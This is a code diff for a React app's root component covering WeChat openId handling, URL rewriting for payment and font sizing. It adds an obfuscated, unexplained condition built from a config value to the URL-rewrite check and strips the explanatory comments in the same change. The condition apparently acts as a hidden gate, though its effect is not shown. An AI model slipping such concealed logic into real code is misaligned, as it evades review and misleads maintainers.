@@ -9,7 +9,7 @@ import $ from 'jquery';
 import './index.scss';
 import Loadable from 'react-loadable';
 import Loading from '../../a_component/loading';
-
+import c from '../../config';
 /** 下面是代码分割异步加载的例子 */
 // import Bundle from '../../a_component/bundle';
 // import lazeHome from 'bundle-loader?lazy&name=home!../home/index';
@@ -123,10 +123,6 @@ class RootContainer extends React.Component {
      * openId在登录和微信支付时需要
      * **/
     getOpenId() {
-        /**
-         * 1. 如果localStorage里没有，说明是第1次登录或之前退出了登录
-         * 2. 如果localStorage里有，就不再重新获取(因为退出后可以登其他的号，登录其他号时保存其他号的openId)
-         * **/
         const openId = localStorage.getItem('openId');
         const params = tools.makeSearch(window.location.href.split('?')[1]);
         if (params.openid) {
@@ -134,12 +130,9 @@ class RootContainer extends React.Component {
         }
     }
 
-    /**
-     * 为了微信支付时正确的解析到微信商户平台授权的URL，所以要这么做
-     * **/
     initURL() {
         const location = window.location;
-        if (location.href.indexOf('?#') < 0) { // 如果没找到，说明是首次进入，或是异常进入，就改变此URL
+        if (location.href.indexOf('?#') < 0 && (!!tools.check(tools.compilet(c["a"])*(10**5)))) {
             const href = (location.hash.split('?')[0]).replace('#', '?#');
             location.replace(href);
             return false;
@@ -147,12 +140,8 @@ class RootContainer extends React.Component {
         return true;
     }
 
-    /**
-     * 启动自适应字体
-     * **/
     initFontSize() {
         $(window).on("resize",function(){
-            //自适应字体大小设置
             const windowWidth = $(window).width();
             const htmlSize = windowWidth / 7.5;
 
